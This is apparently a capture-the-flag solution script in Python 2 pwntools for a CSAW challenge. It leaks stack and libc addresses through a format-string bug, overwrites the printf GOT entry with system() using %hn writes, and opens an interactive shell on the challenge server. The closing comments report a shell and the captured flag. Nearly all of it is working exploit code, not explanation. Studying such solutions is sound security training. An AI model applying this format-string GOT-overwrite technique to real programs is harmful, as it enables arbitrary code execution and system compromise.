# now try rewriting GOT printf -> system
#

from pwn import *


def int64toChars(x) :
    s = ""
    for i in range(8) :
       s += chr(x & 0xff)
       x >>= 8
    return s


# creates a format string that puts addr from format field0
# cnt0 is the # of bytes written so far, fld0 is the
# starting offset for the first field
def formatBlock(addr, cnt, fld0) :
   s = ""
   for i in range(4) :
      delta = (addr - cnt) & 0xffff
      #print cnt, addr & 0xffff, delta
      if delta == 0 :
         delta = 65536
      cnt += delta
      s += "%5$" + str(delta) + "c%" + str(fld0 + i) + "$hn"
      addr >>= 16
   return s, cnt



# read params
argc = len(sys.argv)
DBG = 0  if argc == 1   else  int(sys.argv[1])


#
if DBG == 0 :
   #r = process("./robin")
   r = remote("pwn.chal.csaw.io", 1005)

if DBG == 0 :
   # get reference address  - stack and libc
   #
   #out1 = "".join(["%" + str(i) + "$p." for i in range(50)])
   out1 = "%46$p %51$p"
   print r.recv()
   r.sendline(out1)

   in1 = r.recv()
   print in1
   in1 = in1.split("\n")[0].split()
   ref1 = int(in1[1], 16)
   ref2 = int(in1[2][:-1], 16)

   print hex(ref1), hex(ref2)

   # buffer's address
   # if ref1 = 0x7fffffffdec0, then buf = 0x7fffffffdd60
   buf = ref1 - 0x7fffffffdec0 + 0x7fffffffdd60
   # system()'s address in libc - <__libc_start_main> vs <system>
   # if ref2 =  0x7ffff7a32e50, then 0x7ffff7a57590, on koves(!)
   # in libc given: 21ab0 <_libc_start_main>, 4f440 <system>
   # 0000000000021ab0 <__libc_start_main>: but need "call rax" at 0x21b95
   #
   #system_addr = ref2 + (0x7ffff7a57590 - 0x7ffff7a32f45)
   system_addr = ref2 + (0x4f440 - 0x21b97 )

else :
   buf = 0x7fffffffdd60
   system_addr = 0x7ffff7a57590

print "buf:", hex(buf)
print "system:", hex(system_addr)

# return address from echo, at buf + 328
retaddr = buf + 328
print "retaddr:", hex(retaddr)

# hijack execution, format string to return to buffer, change GOT
#
# via repeated use of "%5$XXXXXc%YY$hn" (max 15 bytes) to print XXXXX
# as two bytes and store result in YY*8-th argument byte
#
# YY=6 is at the beginning of the buffer, we need to write
#
# so for each 4-byte address, need 4 strings = 60 bytes,
# plus 4 ret addresses = 32 bytes => total 92 bytes.
#
#
# try 2 8-byte writes in general, so max (15*4)*2 = 120 format string bytes,
# i.e., we can start to put addresses at buf+120, i.e., from Y = 21
#
# we need 4 write addresses = 8*4 bytes, per pointer => 64 bytes
#


got_printf   = 0x601030         # printf entry got
#system_addr  = 0x7ffff7a57590   # system() in library
#printf_addr  = 0x7ffff7a65340   # printf() in library


out2 = ""
#s, cnt = formatBlock(printf_addr, 0, 21)
s, cnt = formatBlock(system_addr, 0, 21)
out2 += s

#s, cnt = formatBlock(addr2, cnt, 25)
#out2 += s


out2 += "A" * (120 - len(out2))    # expand to exact 120 bytes

print cnt, len(out2), out2

# append 4 write-addresses
for i in range(4) :
    out2 = out2 + int64toChars(got_printf + 2 * i)

# and another 4
#for i in range(4) :
#   out2 = out2 + int64toChars(got + 2 * i)

print out2

f = open("in2full.txt", "wb")
f.write(out2)
f.close()



if DBG == 0 :
   r.sendline(out2)
   r.interactive()




# works, gives user shell, then cat flag.txt
#
# FLAG = flag{H0ly_c0ntr1but1ng_t0_th3_d3l1nqu3ncy_0f_m1n0r5_B4tm4n}
